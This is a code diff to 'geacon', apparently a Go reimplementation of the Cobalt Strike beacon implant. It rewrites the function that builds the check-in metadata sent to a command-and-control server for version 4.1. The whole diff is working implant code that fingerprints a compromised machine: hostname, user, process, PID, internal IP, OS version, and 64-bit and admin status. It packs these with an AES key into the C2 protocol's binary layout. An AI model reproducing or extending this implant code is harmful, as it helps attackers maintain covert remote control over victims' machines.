@@ -11,6 +11,7 @@ import (
 	"geacon/cmd/sysinfo"
 	"geacon/cmd/util"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/imroc/req"
@@ -124,6 +125,12 @@ func EncryptedMetaInfo() string {
 	return finalPakcet
 }
 
+/*
+MetaData for 4.1
+	Key(16) | Charset1(2) | Charset2(2) |
+	ID(4) | PID(4) | Port(2) | Flag(1) | Ver1(1) | Ver2(1) | Build(2) | PTR(4) | PTR_GMH(4) | PTR_GPA(4) |  internal IP(4 LittleEndian) |
+	InfoString(from 51 to all, split with \t) = Computer\tUser\tProcess(if isSSH() this will be SSHVer)
+*/
 func MakeMetaInfo() []byte {
 	crypt.RandomAESKey()
 	sha256hash := sha256.Sum256(config.GlobalKey)
@@ -132,38 +139,73 @@ func MakeMetaInfo() []byte {
 
 	clientID = sysinfo.GeaconID()
 	processID := sysinfo.GetPID()
-	//osVersion := sysinfo.GetOSVersion()
-	osVersion := "4.1"
+	//for link SSH, will not be implemented
+	sshPort := 0
+	/* for is X64 OS, is X64 Process, is ADMIN
+	METADATA_FLAG_NOTHING = 1;
+	METADATA_FLAG_X64_AGENT = 2;
+	METADATA_FLAG_X64_SYSTEM = 4;
+	METADATA_FLAG_ADMIN = 8;
+	*/
+	metadataFlag := sysinfo.GetMetaDataFlag()
+	//for OS Version
+	osVersion := sysinfo.GetOSVersion()
+	osVerSlice := strings.Split(osVersion, ".")
+	osMajorVerison := 0
+	osMinorVersion := 0
+	osBuild := 0
+	if len(osVerSlice) == 3 {
+		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
+		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
+		osBuild, _ = strconv.Atoi(osVerSlice[2])
+	} else if len(osVerSlice) == 2 {
+		osMajorVerison, _ = strconv.Atoi(osVerSlice[0])
+		osMinorVersion, _ = strconv.Atoi(osVerSlice[1])
+	}
+
+
+	//for Smart Inject, will not be implemented
+	ptrFuncAddr := 0
+	ptrGMHFuncAddr := 0
+	ptrGPAFuncAddr := 0
+
 	processName := sysinfo.GetProcessName()
-	localIP := sysinfo.GetLocalIP()
+	localIP := sysinfo.GetLocalIPInt()
 	hostName := sysinfo.GetComputerName()
 	currentUser := sysinfo.GetUsername()
-	var port uint16 = 0
-	var flag byte = 14 // high priv for test
 
 	localeANSI := sysinfo.GetCodePageANSI()
 	localeOEM := sysinfo.GetCodePageOEM()
 
-	// onlineInfoBytes : clientIDbytes (bigEnd), processIdbytes(bigEnd), portBytes, osInfoBytes
-	//		osInfoBytes: ver, localIP, hostName, currentUser, processName
 	clientIDBytes := make([]byte, 4)
 	processIDBytes := make([]byte, 4)
-	portBytes := make([]byte, 2)
+	sshPortBytes := make([]byte, 2)
+	flagBytes := make([]byte, 1)
+	majorVerBytes := make([]byte, 1)
+	minorVerBytes := make([]byte, 1)
+	buildBytes := make([]byte, 2)
+	ptrBytes := make([]byte, 4)
+	ptrGMHBytes := make([]byte, 4)
+	ptrGPABytes := make([]byte, 4)
+	localIPBytes := make([]byte, 4)
 	binary.BigEndian.PutUint32(clientIDBytes, uint32(clientID))
 	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
-	binary.BigEndian.PutUint16(portBytes, port)
+	binary.BigEndian.PutUint16(sshPortBytes, uint16(sshPort))
+	flagBytes[0] = byte(metadataFlag)
+	majorVerBytes[0] = byte(osMajorVerison)
+	minorVerBytes[0] = byte(osMinorVersion)
+	binary.BigEndian.PutUint16(buildBytes, uint16(osBuild))
+	binary.BigEndian.PutUint32(ptrBytes, uint32(ptrFuncAddr))
+	binary.BigEndian.PutUint32(ptrGMHBytes, uint32(ptrGMHFuncAddr))
+	binary.BigEndian.PutUint32(ptrGPABytes, uint32(ptrGPAFuncAddr))
+	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))
 
-	// osInfoBytes
-	// ver,localIP,hostName,currentUser,processName
-	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%s", osVersion, localIP, hostName, currentUser, processName)
-
-	// insert port
-	osInfoBytes := make([]byte, len([]byte(osInfo))+1)
-	osInfoSlicne := []byte(osInfo)
-	osInfoBytes = append([]byte{flag}, osInfoSlicne...)
+	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	osInfoBytes := []byte(osInfo)
 
 	fmt.Printf("clientID: %d", clientID)
-	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, portBytes, osInfoBytes)
+	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
+		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 
 	metaInfo := util.BytesCombine(config.GlobalKey, localeANSI, localeOEM, onlineInfoBytes)
 	magicNum := sysinfo.GetMagicHead()
